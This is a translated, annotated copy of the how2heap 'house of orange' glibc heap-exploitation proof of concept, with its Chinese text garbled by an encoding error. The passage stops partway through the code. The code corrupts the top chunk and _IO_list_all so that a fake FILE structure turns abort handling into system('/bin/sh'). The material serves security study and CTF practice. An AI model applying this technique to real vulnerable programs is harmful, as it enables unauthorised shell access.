# how2heapä¹‹house of orange
|
##### è¯‘æ–‡å£°æ˜
æœ¬æ–‡æ˜¯ç¿»è¯‘æ–‡ç« 
è¯‘æ–‡ä»…ä¾›å‚è€ƒï¼Œå…·ä½“å†…å®¹è¡¨è¾¾ä»¥åŠå«ä¹‰åŸæ–‡ä¸ºå‡†ã€‚
> æ¬¢è¿å„ä½å–œæ¬¢å®‰å…¨çš„å°ä¼™ä¼´ä»¬åŠ å…¥æ˜Ÿç›Ÿå®‰å…¨ UVEgZ3JvdXA6IDU3MDI5NTQ2MQ==
>
> æœ¬æ–‡åŒ…å«house of orange
PS:ç”±äºæœ¬äººæ‰ç–å­¦æµ…,æ–‡ä¸­å¯èƒ½ä¼šæœ‰ä¸€äº›ç†è§£çš„ä¸å¯¹çš„åœ°æ–¹,æ¬¢è¿å„ä½æ–§æ­£ ğŸ™‚
## å‚è€ƒç½‘ç«™
    https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_orange-zh/
    http://blog.angelboy.tw/
    http://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html
## house of orange
###  åº
house of orangeæ¥è‡ªangelboyåœ¨hitcon
2016ä¸Šå‡ºçš„ä¸€é“é¢˜ç›®,è¿™ä¸ªæ”»å‡»æ–¹æ³•å¹¶ä¸å•æŒ‡æœ¬æ–‡æ‰€è¯´çš„,è€Œæ˜¯æŒ‡å…³äºå…¶ä¸€ç³»åˆ—çš„ä¼´ç”Ÿé¢˜ç›®çš„æ¼æ´åˆ©ç”¨æŠ€å·§
å…¶æœ€ä¸»è¦çš„åŸç†å°±æ˜¯åœ¨æ²¡æœ‰freeçš„æƒ…å†µä¸‹å¦‚ä½•äº§ç”Ÿä¸€ä¸ªfreeçŠ¶æ€çš„binså’Œio_fileçš„åˆ©ç”¨
ä½†æœ€æœ€æœ€ä¸»è¦çš„åˆ©ç”¨æ˜¯io_fileçš„åˆ©ç”¨
###  æºä»£ç 
è¿™é‡Œæˆ‘ä¸€è¡Œéƒ½æ²¡æœ‰åˆ ,ä»…ä»…åŠ äº†æ³¨é‡Š
    #include 
    #include 
    #include 
    /*
      The House of Orange uses an overflow in the heap to corrupt the _IO_list_all pointer
      It requires a leak of the heap and the libc
      Credit: http://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html
    */
    /*
       This function is just present to emulate the scenario where
       the address of the function system is known.
    */
    int winner ( char *ptr);
    int main()
    {
        /*
          //house of orange
          //house of orangeèµ·æºäºä¸€ä¸ªåœ¨å †ä¸Šæœ‰ä¸€ä¸ªå¯ä»¥ç ´åtop chunkçš„ç¼“å†²åŒºæº¢å‡ºæ¼æ´
          The House of Orange starts with the assumption that a buffer overflow exists on the heap
          using which the Top (also called the Wilderness) chunk can be corrupted.
          //åœ¨å¼€å§‹çš„æ—¶å€™,æ•´ä¸ªheapéƒ½æ˜¯top chunkçš„ä¸€éƒ¨åˆ†
          At the beginning of execution, the entire heap is part of the Top chunk.
          //é€šå¸¸æ¥è¯´,ç¬¬ä¸€æ¬¡ç”³è¯·å†…å­˜çš„æ—¶å€™ä¼šä»top chunkä¸­åˆ‡å‡ºä¸€éƒ¨åˆ†æ¥å¤„ç†è¯·æ±‚
          The first allocations are usually pieces of the Top chunk that are broken off to service the request.
          //ç„¶å,éšç€æˆ‘ä»¬ä¸åœçš„åˆ†é…top chunk,top chunkä¼šå˜å¾—è¶Šæ¥è¶Šå°
          Thus, with every allocation, the Top chunks keeps getting smaller.
          //è€Œåœ¨æˆ‘ä»¬æ‰€ç”³è¯·çš„sizeæ¯”top chunkæ›´å¤§æ—¶ä¼šæœ‰ä¸¤ä»¶äº‹æƒ…å‘ç”Ÿ
          And in a situation where the size of the Top chunk is smaller than the requested value,
          there are two possibilities:
          //1.æ‹“å±•top chunk,2.mmapä¸€ä¸ªæ–°é¡µ
           1) Extend the Top chunk
           2) Mmap a new page
          If the size requested is smaller than 0x21000, then the former is followed.
        */
        char *p1, *p2;
        size_t io_list_all, *top;
        //åœ¨2.26çš„æ›´æ”¹ä¸­,ç¨‹åºä¸åœ¨è°ƒç”¨_IO_flush_all_lockpçš„malloc_printerçš„è¡Œä¸ºç§»é™¤äº†æˆ‘ä»¬æ”»å‡»çš„åª’ä»‹
        fprintf(stderr, "The attack vector of this technique was removed by changing the behavior of malloc_printerr, "
            "which is no longer calling _IO_flush_all_lockp, in 91e7cf982d0104f0e71770f5ae8e3faf352dea9f (2.26).n");
        //ç”±äºå¯¹glibc 2.24 ä¸­ _IO_FILE vtableè¿›è¡Œäº†ç™½åå•æ£€æŸ¥,å› æ­¤è¿™ç§æ”»å‡»æ‰‹æ®µå¾—åˆ°äº†æŠ‘åˆ¶
        fprintf(stderr, "Since glibc 2.24 _IO_FILE vtable are checked against a whitelist breaking this exploit,"
            "https://sourceware.org/git/?p=glibc.git;a=commit;h=db3476aff19b75c4fdefbe65fcd5f0a90588ba51n");
        /*
          Firstly, lets allocate a chunk on the heap.
        */
        p1 = malloc(0x400-16);
        /*
          //é€šå¸¸æ¥è¯´,å †æ˜¯è¢«ä¸€ä¸ªå¤§å°ä¸º0x21000çš„top chunkæ‰€åˆ†é…çš„
           The heap is usually allocated with a top chunk of size 0x21000
           //åœ¨æˆ‘ä»¬åˆ†é…äº†ä¸€ä¸ª0x400çš„chunkå
           Since we've allocate a chunk of size 0x400 already,
           //æˆ‘ä»¬å‰©ä¸‹çš„å¤§å°ä¸º0x20c00,åœ¨prev_inuseä½è¢«è®¾ä¸º1å,åº”è¯¥æ˜¯0x20c01
           what's left is 0x20c00 with the PREV_INUSE bit set => 0x20c01.
           //heapçš„è¾¹ç•Œæ˜¯é¡µå¯¹é½çš„.ç”±äºtop chunkæ˜¯å¯¹ä¸Šçš„æœ€åä¸€ä¸ªchunk,å› æ­¤å®ƒåœ¨ç»“å°¾ä¹Ÿå¿…é¡»æ˜¯é¡µå¯¹é½çš„
           The heap boundaries are page aligned. Since the Top chunk is the last chunk on the heap,
           it must also be page aligned at the end.
           //å¹¶ä¸”,å¦‚æœä¸€ä¸ªä¸top chunk,ç›¸é‚»çš„chunkè¢«é‡Šæ”¾äº†.é‚£ä¹ˆå°±ä¼šä¸top chunkåˆå¹¶.å› æ­¤top chunk çš„prev_inusä½ä¹Ÿä¸€ç›´è¢«è®¾ç½®ä¸º1
           Also, if a chunk that is adjacent to the Top chunk is to be freed,
           then it gets merged with the Top chunk. So the PREV_INUSE bit of the Top chunk is always set.
           //è¿™ä¹Ÿå°±æ„å‘³ç€å§‹ç»ˆè¦æ»¡è¶³ä¸¤ä¸ªæ¡ä»¶
           So that means that there are two conditions that must always be true.
           //1) top chunk+sizeå¿…é¡»æ˜¯é¡µå¯¹é½çš„
            1) Top chunk + size has to be page aligned
            //2)top chunkçš„prev_inuseä½å¿…é¡»ä¸º1
            2) Top chunk's prev_inuse bit has to be set.
           //å¦‚æœæˆ‘ä»¬å°†top chunkçš„sizeè®¾ä¸º0xcc|PREV_INUSEçš„æ—¶å€™,æ‰€æœ‰çš„æ¡ä»¶éƒ½ä¼šæ»¡è¶³
           We can satisfy both of these conditions if we set the size of the Top chunk to be 0xc00 | PREV_INUSE.
           //æˆ‘ä»¬å‰©ä¸‹äº†0x20c01
           What's left is 0x20c01
           Now, let's satisfy the conditions
           1) Top chunk + size has to be page aligned
           2) Top chunk's prev_inuse bit has to be set.
        */
        top = (size_t *) ( (char *) p1 + 0x400 - 16);
        top[1] = 0xc01;
        /*
           //ç°åœ¨æˆ‘ä»¬éœ€è¦ä¸€ä¸ªæ¯”top chunkçš„sizeæ›´å¤§çš„chunk
           Now we request a chunk of size larger than the size of the Top chunk.
           //mallocä¼šé€šè¿‡æ‹“å±•top chunkæ¥æ»¡è¶³æˆ‘ä»¬çš„éœ€æ±‚
           Malloc tries to service this request by extending the Top chunk
           //è¿™ä¸ªä¼šå¼ºåˆ¶è°ƒç”¨sysmalloc
           This forces sysmalloc to be invoked.
           In the usual scenario, the heap looks like the following
              |------------|------------|------...----|
              |    chunk   |    chunk   | Top  ...    |
              |------------|------------|------...----|
          heap start                              heap end
           //å¹¶ä¸”æ–°åˆ†é…çš„åŒºåŸŸå°†äºæ—§çš„heapçš„æœ«å°¾ç›¸é‚»
           And the new area that gets allocated is contiguous to the old heap end.
           //å› æ­¤top chunkçš„æ–°sizeæ˜¯æ—§çš„szieå’Œæ–°åˆ†é…çš„sizeä¹‹å’Œ
           So the new size of the Top chunk is the sum of the old size and the newly allocated size.
           //ä¸ºäº†æŒç»­è·Ÿè¸ªsizeçš„æ”¹å˜,mallocä½¿ç”¨äº†ä¸€ä¸ªfencepost chunkæ¥ä½œä¸ºä¸€ä¸ªä¸´æ—¶çš„chunk
           In order to keep track of this change in size, malloc uses a fencepost chunk,
           which is basically a temporary chunk.
           //åœ¨top chunkçš„sizeè¢«æ›´æ–°ä¹‹å,è¿™ä¸ªchunkå°†ä¼šè¢«Free
           After the size of the Top chunk has been updated, this chunk gets freed.
           In our scenario however, the heap looks like
              |------------|------------|------..--|--...--|---------|
              |    chunk   |    chunk   | Top  ..  |  ...  | new Top |
              |------------|------------|------..--|--...--|---------|
         heap start                            heap end
           //åœ¨è¿™ä¸ªæƒ…å†µä¸‹,æ–°çš„top chunkå°†ä¼šåœ¨heapçš„æœ«å°¾ç›¸é‚»å¤„å¼€å§‹
           In this situation, the new Top will be starting from an address that is adjacent to the heap end.
           //å› æ­¤è¿™ä¸ªåœ¨ç¬¬äºŒä¸ªchunkå’Œheapç»“å°¾çš„åŒºåŸŸä¹‹é—´æ˜¯æ²¡æœ‰è¢«ä½¿ç”¨çš„
           So the area between the second chunk and the heap end is unused.
           //ä½†æ—§çš„top chunkå´è¢«é‡Šæ”¾äº†
           And the old Top chunk gets freed.
           //ç”±äºè¢«é‡Šæ”¾çš„top chunkåˆæ¯”fastbin sizesè¦å“’,ä»–ä¼šè¢«æ”¾è¿›æˆ‘ä»¬çš„unsorted binsä¸­
           Since the size of the Top chunk, when it is freed, is larger than the fastbin sizes,
           it gets added to list of unsorted bins.
           //ç°åœ¨æˆ‘ä»¬éœ€è¦ä¸€ä¸ªæ¯”top chunkæ›´å¤§çš„chunk
           Now we request a chunk of size larger than the size of the top chunk.
           //å°±ä¼šå¼ºè¡Œè°ƒç”¨sysmallocäº†
           This forces sysmalloc to be invoked.
           And ultimately invokes _int_free
           Finally the heap looks like this:
              |------------|------------|------..--|--...--|---------|
              |    chunk   |    chunk   | free ..  |  ...  | new Top |
              |------------|------------|------..--|--...--|---------|
         heap start                                             new heap end
        */
        p2 = malloc(0x1000);
        /*
          //éœ€è¦æ³¨æ„çš„æ˜¯,ä¸Šé¢çš„chunkä¼šè¢«åˆ†é…åˆ°é›¶ä¸€é¡µä¸­,å®ƒä¼šè¢«æ”¾åˆ°å“¦æ—§çš„heapçš„æœ«å°¾
          Note that the above chunk will be allocated in a different page
          that gets mmapped. It will be placed after the old heap's end
          //ç°åœ¨æˆ‘ä»¬å°±ç•™ä¸‹äº†é‚£ä¸ªè¢«freeæ‰çš„æ—§top chunk,ä»–è¢«æ”¾å…¥äº†unsorted binä¸­
          Now we are left with the old Top chunk that is freed and has been added into the list of unsorted bins
          //ä»è¿™é‡Œå¼€å§‹å°±æ˜¯æ”»å‡»çš„ç¬¬äºŒé˜¶æ®µäº†,æˆ‘ä»¬å‡è®¾æˆ‘ä»¬æœ‰äº†ä¸€ä¸ªå¯ä»¥æº¢å‡ºåˆ°old top chunkçš„æ¼æ´æ¥è®©æˆ‘ä»¬å¯ä»¥è¦†å†™chunkçš„size
          Here starts phase two of the attack. We assume that we have an overflow into the old
          top chunk so we could overwrite the chunk's size.
          //ç¬¬äºŒæ®µæˆ‘ä»¬éœ€è¦å†æ¬¡åˆ©ç”¨æº¢å‡ºæ¥è¦†å†™åœ¨unsorted binå†…chunkçš„fdå’ŒbkæŒ‡é’ˆ
          For the second phase we utilize this overflow again to overwrite the fd and bk pointer
          of this chunk in the unsorted bin list.
          //æœ‰ä¸¤ä¸ªå¸¸è§çš„æ–¹æ³•æ¥åˆ©ç”¨å½“å‰çš„çŠ¶æ€:
          There are two common ways to exploit the current state:
          //é€šè¿‡è®¾ç½®æŒ‡é’ˆæ¥é€ æˆä»»æ„åœ°å€åˆ†é…(éœ€è¦è‡³å°‘åˆ†é…ä¸¤æ¬¡)
          //ç”¨chunkçš„unlinkæ¥å†™libcçš„main_arena unsorted-bin-list(éœ€è¦è‡³å°‘ä¸€æ¬¡åˆ†é…)
            - Get an allocation in an *arbitrary* location by setting the pointers accordingly (requires at least two allocations)
            - Use the unlinking of the chunk for an *where*-controlled write of the
              libc's main_arena unsorted-bin-list. (requires at least one allocation)
          //ä¹‹å‰çš„æ”»å‡»éƒ½å¾ˆå®¹æ˜“åˆ©ç”¨,å› æ­¤è¿™é‡Œæˆ‘ä»¬åªè¯¦ç»†è¯´æ˜åè€…çš„ä¸€ç§å˜ä½“,æ˜¯ç”±angelboyçš„åšå®¢ä¸Šå‡ºæ¥çš„ä¸€ç§å˜ä½“
          The former attack is pretty straight forward to exploit, so we will only elaborate
          on a variant of the latter, developed by Angelboy in the blog post linked above.
          //è¿™ä¸ªæ”»å‡»ç‚’é¸¡æ£’,å› ä¸ºå®ƒåˆ©ç”¨äº†ç»ˆæ­¢è°ƒç”¨,è€Œç»ˆæ­¢è°ƒç”¨åŸæœ¬æ˜¯å®ƒæ£€æµ‹åˆ°å †çš„ä»»ä½•è™šå‡çŠ¶æ€æ‰ä¼šè§¦å‘çš„
          The attack is pretty stunning, as it exploits the abort call itself, which
          is triggered when the libc detects any bogus state of the heap.
          //æ¯å½“ç»ˆæ­¢è°ƒç”¨è§¦å‘çš„æ—¶å€™,ä»–éƒ½ä¼šé€šè¿‡è°ƒç”¨_IO_flush_all_lockpåˆ·æ–°æ‰€æœ‰æ–‡ä»¶æŒ‡é’ˆ
          //æœ€ç»ˆä¼šéå†_IO_list_allé“¾è¡¨å¹¶è°ƒç”¨_IO_OVERFLOW
          Whenever abort is triggered, it will flush all the file pointers by calling
          _IO_flush_all_lockp. Eventually, walking through the linked list in
          _IO_list_all and calling _IO_OVERFLOW on them.
          //åŠæ³•æ˜¯é€šè¿‡ä¸€ä¸ªfake pointeræ¥è¦†å†™_IO_list_allæŒ‡é’ˆ,è®©_IO_OVERFLOWæŒ‡å‘systemå‡½æ•°å¹¶å°†å…¶å‰8ä¸ªå­—èŠ‚è®¾ç½®ä¸º'/bin/sh',è¿™æ ·å°±ä¼šåœ¨è°ƒç”¨_IO_OVERFLOWæ—¶è°ƒç”¨system('/bin/sh')
          The idea is to overwrite the _IO_list_all pointer with a fake file pointer, whose
          _IO_OVERLOW points to system and whose first 8 bytes are set to '/bin/sh', so
          that calling _IO_OVERFLOW(fp, EOF) translates to system('/bin/sh').
          More about file-pointer exploitation can be found here:
          https://outflux.net/blog/archives/2011/12/22/abusing-the-file-structure/
          //_IO_list_allçš„åœ°å€å¯ä»¥é€šè¿‡free chunkçš„fdå’ŒbkæŒ‡é’ˆæ¥è®¡ç®—,å½“ä»–ä»¬æŒ‡å‘libcçš„main_arenaçš„æ—¶å€™
          The address of the _IO_list_all can be calculated from the fd and bk of the free chunk, as they
          currently point to the libc's main_arena.
        */
        io_list_all = top[2] + 0x9a8;
        /*
          //æˆ‘ä»¬è®¡åˆ’æ¥è¦†ç›–ç°åœ¨ä¾æ—§è¢«æ”¾åˆ°unsorted binsä¸­old topçš„fdå’ŒbkæŒ‡é’ˆ
          We plan to overwrite the fd and bk pointers of the old top,
          which has now been added to the unsorted bins.
          //å½“mallocå°è¯•é€šè¿‡åˆ†è§£free chunkæ¥æ»¡è¶³è¯·æ±‚çš„æ—¶å€™,chunk->bk->fdçš„å€¼å°†ä¼šè¢«libcçš„main_arenaä¸­çš„unsorted-bin-liståœ°å€è¦†ç›–
          When malloc tries to satisfy a request by splitting this free chunk
          the value at chunk->bk->fd gets overwritten with the address of the unsorted-bin-list
          in libc's main_arena.
          //æ³¨æ„,è¿™ä¸ªè¦†å†™å‘ç”Ÿåœ¨å®Œæ•´æ€§æ£€æŸ¥ä¹‹å‰,å› æ­¤å¯ä»¥å‘ç”Ÿåœ¨ä»»æ„æƒ…å†µä¸‹
          Note that this overwrite occurs before the sanity check and therefore, will occur in any
          case.
          //åœ¨è¿™é‡Œ,æˆ‘ä»¬è¦æ±‚chunk->bk->fdæŒ‡å‘_IO_list_all
          Here, we require that chunk->bk->fd to be the value of _IO_list_all.
          //å› æ­¤,æˆ‘ä»¬éœ€è¦æŠŠchunk->bkè®¾ä¸º_IO_list_all-16
          So, we should set chunk->bk to be _IO_list_all - 16
        */
        top[3] = io_list_all - 0x10;
        /*
          //åœ¨ç»“å°¾çš„åœ°æ–¹,systemå‡½æ•°å°†ä¼šé€šè¿‡è¿™ä¸ªfileæŒ‡é’ˆæ¥è°ƒç”¨
          At the end, the system function will be invoked with the pointer to this file pointer.
          //å¦‚æœæˆ‘ä»¬å°†å‰8ä¸ªå­—èŠ‚è®¾ä¸º /bin/sh,ä»–å°±ä¼šç›¸å½“äºsystem(/bin/sh)
          If we fill the first 8 bytes with /bin/sh, it is equivalent to system(/bin/sh)
        */
        memcpy( ( char *) top, "/bin/shx00", 8);
        /*
          //_IO_flush_all_lockpå‡½æ•°éå†_IO_list_allæŒ‡é’ˆé“¾è¡¨